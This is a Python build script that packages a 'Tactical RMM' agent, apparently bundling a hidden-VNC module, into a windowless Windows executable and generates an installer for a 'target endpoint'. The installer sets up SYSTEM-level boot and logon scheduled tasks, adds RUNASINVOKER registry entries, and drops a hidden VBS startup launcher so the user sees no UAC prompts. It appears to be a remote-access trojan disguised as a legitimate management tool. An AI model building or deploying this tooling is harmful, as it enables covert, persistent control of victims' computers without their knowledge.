"""
Build script to compile and package the TRMM Background Agent into a standalone executable.
"""

import subprocess
import sys
import os
import shutil

ROOT_DIR = os.path.dirname(os.path.abspath(__file__))
DIST_DIR = os.path.join(ROOT_DIR, "dist")
BUILD_DIR = os.path.join(ROOT_DIR, "build")

def build():
    is_release = "--release" in sys.argv
    use_pyinstaller = "--pyinstaller" in sys.argv

    print("=" * 60)
    if use_pyinstaller:
        print(" [*] Compiling Tactical RMM Background Agent (PyInstaller)")
    elif is_release:
        print(" [*] Compiling Tactical RMM Background Agent (Nuitka Release: --mode=onefile)")
    else:
        print(" [*] Compiling Tactical RMM Background Agent (Nuitka Dev: --mode=standalone)")
    print("=" * 60)

    if not use_pyinstaller:
        if is_release:
            nuitka_dist = os.path.join(DIST_DIR, "TRMM_Agent")
            os.makedirs(nuitka_dist, exist_ok=True)
            cmd = [
                sys.executable,
                "-m",
                "nuitka",
                "--mode=onefile",
                "--windows-console-mode=disable",
                "--assume-yes-for-downloads",
                "--show-progress",
                f"--output-filename=TRMM_Agent.exe",
                f"--output-dir={nuitka_dist}",
                f"--include-data-dir={os.path.join(ROOT_DIR, 'hvnc', 'static')}=hvnc/static",
                "--include-package=uvicorn",
                "--include-package=fastapi",
                "--include-package=websockets",
                "--include-package=PIL",
                "--include-package=psutil",
                "--include-package=hvnc",
                "--include-package=agent_client",
                os.path.join(ROOT_DIR, "agent_service.py"),
            ]
        else:
            nuitka_dist = os.path.join(DIST_DIR, "TRMM_Agent_Dev")
            os.makedirs(nuitka_dist, exist_ok=True)
            cmd = [
                sys.executable,
                "-m",
                "nuitka",
                "--mode=standalone",
                "--windows-console-mode=force",
                "--assume-yes-for-downloads",
                "--show-progress",
                f"--output-filename=TRMM_Agent.exe",
                f"--output-dir={nuitka_dist}",
                f"--include-data-dir={os.path.join(ROOT_DIR, 'hvnc', 'static')}=hvnc/static",
                "--include-package=uvicorn",
                "--include-package=fastapi",
                "--include-package=websockets",
                "--include-package=PIL",
                "--include-package=psutil",
                "--include-package=hvnc",
                "--include-package=agent_client",
                os.path.join(ROOT_DIR, "agent_service.py"),
            ]
    else:
        cmd = [
            sys.executable,
            "-m",
            "PyInstaller",
            "--noconfirm",
            "--onedir",
            "--windowed",
            "--name",
            "TRMM_Agent",
            "--add-data",
            f"{os.path.join(ROOT_DIR, 'hvnc', 'static')};hvnc/static",
            "--hidden-import", "uvicorn",
            "--hidden-import", "uvicorn.protocols.http.auto",
            "--hidden-import", "uvicorn.protocols.websockets.auto",
            "--hidden-import", "uvicorn.lifespan.on",
            "--hidden-import", "fastapi",
            "--hidden-import", "websockets",
            "--hidden-import", "PIL",
            "--hidden-import", "PIL.Image",
            "--hidden-import", "psutil",
            "--hidden-import", "hvnc",
            "--hidden-import", "hvnc.desktop",
            "--hidden-import", "hvnc.spawner",
            "--hidden-import", "hvnc.compositor",
            "--hidden-import", "hvnc.input_handler",
            "--hidden-import", "hvnc.mirror",
            "--hidden-import", "agent_client",
            "--hidden-import", "agent_client.client",
            "--hidden-import", "agent_client.provisioner",
            os.path.join(ROOT_DIR, "agent_service.py"),
        ]

    print(f"Executing: {' '.join(cmd)}\n")
    res = subprocess.run(cmd, cwd=ROOT_DIR)

    if res.returncode != 0:
        print("\n[!] Build failed.")
        sys.exit(res.returncode)

    out_folder = os.path.join(DIST_DIR, "TRMM_Agent_Dev" if (not use_pyinstaller and not is_release) else "TRMM_Agent")

    # Generate a silent installer script for the target endpoint
    installer_script = r"""@echo off
:: ============================================================
:: Tactical RMM Agent — Silent Installer
:: Registers the agent as a Windows Scheduled Task that
:: auto-starts at system BOOT (before any user logs in),
:: running as SYSTEM with highest privileges — no UAC needed.
:: ============================================================
setlocal EnableDelayedExpansion

:: ---- Require admin ----
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] This installer must be run as Administrator.
    echo     Right-click install.bat and choose "Run as administrator".
    pause
    exit /b 1
)

echo [*] Stopping any running agent processes...
taskkill /F /IM TRMM_Agent.exe >nul 2>&1
timeout /t 2 /nobreak >nul 2>&1

echo [*] Removing legacy startup shortcuts (if any)...
del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\TRMM_Agent*.lnk" >nul 2>&1
del /f /q "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\TRMM_Agent*.lnk" >nul 2>&1

echo [*] Removing old scheduled task (if any)...
schtasks /Delete /TN "TRMM_Agent_Persist" /F >nul 2>&1

set "INSTALL_DIR=C:\Program Files\TRMM_Agent"
echo [*] Installing to %INSTALL_DIR% ...
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
xcopy /E /Y /I "%~dp0*" "%INSTALL_DIR%\" >nul

echo [*] Registering boot persistence via Task Scheduler...
schtasks /Create ^
    /TN "TRMM_Agent_Persist" ^
    /TR "\"%INSTALL_DIR%\TRMM_Agent.exe\"" ^
    /SC ONSTART ^
    /RU SYSTEM ^
    /RL HIGHEST ^
    /DELAY 0000:10 ^
    /F

echo [*] Registering user logon persistence via Task Scheduler...
schtasks /Create ^
    /TN "TRMM_Agent_User" ^
    /TR "\"%INSTALL_DIR%\TRMM_Agent.exe\"" ^
    /SC ONLOGON ^
    /RL HIGHEST ^
    /F

echo [*] Configuring silent logon persistence (Zero UAC prompts)...
powershell -NoProfile -Command "Unblock-File -Path '%INSTALL_DIR%\TRMM_Agent.exe'" >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "%INSTALL_DIR%\TRMM_Agent.exe" /t REG_SZ /d "~ RUNASINVOKER" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "%INSTALL_DIR%\TRMM_Agent.exe" /t REG_SZ /d "~ RUNASINVOKER" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "TRMM_Agent" /f >nul 2>&1
powershell -NoProfile -Command "$vbs = [Environment]::GetFolderPath('Startup') + '\TRMM_Agent.vbs'; $c = @('Set ws = CreateObject(\"WScript.Shell\")', 'ws.Environment(\"Process\")(\"__COMPAT_LAYER\") = \"RunAsInvoker\"', 'ws.Run \"\"\"%INSTALL_DIR%\TRMM_Agent.exe\"\"\", 0, False'); [IO.File]::WriteAllLines($vbs, $c); Unblock-File -Path $vbs" >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TRMM_Agent" /t REG_SZ /d "wscript.exe \"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\TRMM_Agent.vbs\"" /f >nul 2>&1

echo [*] Launching agent now...
start "" "%INSTALL_DIR%\TRMM_Agent.exe"

echo.
echo ============================================================
echo  [+] Tactical RMM Agent installed and active.
echo  [*] The agent will automatically start silently on every reboot.
echo  [*] Zero UAC prompts will appear to the user.
echo  [*] To uninstall, run uninstall.bat as Administrator.
echo ============================================================
"""

    uninstaller_script = r"""@echo off
:: ============================================================
:: Tactical RMM Agent — Silent Uninstaller
:: ============================================================
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] Must be run as Administrator.
    pause
    exit /b 1
)

echo [*] Stopping agent...
taskkill /F /IM TRMM_Agent.exe >nul 2>&1
timeout /t 2 /nobreak >nul 2>&1

echo [*] Removing scheduled tasks...
schtasks /Delete /TN "TRMM_Agent_Persist" /F >nul 2>&1
schtasks /Delete /TN "TRMM_Agent_User" /F >nul 2>&1

echo [*] Removing registry autorun keys...
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "TRMM_Agent" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TRMM_Agent" /f >nul 2>&1

echo [*] Removing startup shortcuts and scripts...
del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\TRMM_Agent*.lnk" >nul 2>&1
del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\TRMM_Agent.vbs" >nul 2>&1
del /f /q "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\TRMM_Agent*.lnk" >nul 2>&1
del /f /q "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\TRMM_Agent.vbs" >nul 2>&1

echo [*] Removing install directory...
rmdir /S /Q "C:\Program Files\TRMM_Agent" >nul 2>&1

echo [+] Tactical RMM Agent fully removed.
"""

    with open(os.path.join(out_folder, "install.bat"), "w") as f:
        f.write(installer_script)

    with open(os.path.join(out_folder, "uninstall.bat"), "w") as f:
        f.write(uninstaller_script)

    print("\n" + "=" * 60)
    print(" [+] Build Succeeded!")
    print(f" [*] Agent Distribution Package: {out_folder}")
    print(" [*] Deployment Files Generated:")
    print(f"    - TRMM_Agent.exe (Standalone executable)")
    print(f"    - install.bat    (One-click target machine installer)")
    print(f"    - uninstall.bat  (One-click uninstaller)")
    print("=" * 60)

if __name__ == "__main__":
    build()
